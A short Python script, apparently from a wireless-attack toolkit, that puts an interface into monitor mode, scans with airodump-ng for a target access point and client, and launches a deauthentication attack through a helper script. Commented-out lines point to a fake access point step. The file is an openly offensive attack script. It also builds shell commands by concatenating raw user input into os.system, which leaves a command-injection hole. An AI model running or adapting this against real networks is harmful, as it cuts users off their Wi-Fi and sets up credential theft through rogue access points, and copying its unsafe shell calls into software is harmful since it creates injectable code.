import os

print("***** Part 1: choosing the AP we want to hack. ***** \n")
os.system('ifconfig')
interface = input("please enter the interface name you want to put in 'monitor mode': \n")
os.system('ifconfig ' + interface + ' down')
os.system('iwconfig ' + interface + ' mode monitor')
os.system('ifconfig ' + interface + ' up')
print("!! - IMPORTANT: in the end don't forget to put the interface back in 'managed mode'. You can do that by running the command - python3 managed_mode.py " + interface + "\n")

print("***** Scaning for network *****")
print("Press 'Ctrl+C' when you see the AP.")
os.system ('airodump-ng ' + interface)
ap = input("Please enter the BSSID of the AP you want to attack. \n")
channel = input("Please enter the channel of the AP you chose. \n")
name = input("Please enter the ESSID of the AP you chose. \n ")
print("You need to verify that at least 1 client is connected to the AP you chose. \n")
print("Press 'Ctrl+C' when you see the client.")
os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
client = input("Please enter the MAC ADDR of the client. \n")
os.system('python3 deauth.py ' + client + ' ' + ap + ' ' + interface)



#line="python3 fake_ap.py " + linuxOS +" " + interface + " " + ssid
#os.system(line)
